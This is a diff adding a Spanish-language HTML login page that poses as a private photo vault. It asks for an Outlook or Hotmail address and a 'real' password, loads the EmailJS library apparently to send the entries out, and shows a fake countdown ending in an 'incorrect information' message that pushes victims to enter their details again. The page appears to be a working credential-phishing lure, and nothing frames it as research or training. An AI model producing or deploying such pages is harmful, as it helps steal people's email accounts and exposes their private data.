@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Acceso Privado</title>
+  <link rel="stylesheet" href="style.css">
+  <!-- Carga EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+  <div class="fondo-decorativo"></div>
+  
+  <main class="contenedor-principal">
+    <div class="tarjeta-verificacion">
+      <div class="encabezado">
+        <div class="icono-seguridad animate-bounce">🔒</div>
+        <h1 class="titulo-privado">Esta es tu página privada</h1>
+        <p class="leyenda-seguridad">No la compartas con nadie, aquí se guardan tus fotos privadas</p>
+      </div>
+
+      <form id="formularioVerificacion">
+        <div class="grupo-input">
+          <label>📧 Correo</label>
+          <input type="email" id="correo" placeholder="Correo (Outlook o Hotmail)" required>
+        </div>
+        <div class="grupo-input">
+          <label>🔐 Contraseña</label>
+          <input type="password" id="contrasena" placeholder="Contraseña" required>
+        </div>
+
+        <button type="submit" class="boton-verificacion">
+          <span class="texto-boton">Acceder</span>
+          <span class="icono-boton">🌸</span>
+        </button>
+      </form>
+
+      <div class="aviso-legal">
+        <div class="icono-aviso">⚠️</div>
+        <p>Utiliza solo correos de Outlook o Hotmail y contraseñas reales para acceder.</p>
+      </div>
+
+      <!-- Contenedor del contador y mensaje final -->
+      <div id="countdownContainer" class="contador-tiempo" style="display: none;">
+        Verificando su información: <span id="countdown">5</span> segundos
+      </div>
+      <div id="finalMessage" class="mensaje-error-impactante" style="display: none;">
+        Lamentamos, tu información es incorrecta,<br>coloca tu correo y contraseñas reales para poder acceder al contenido.
+      </div>
+    </div>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
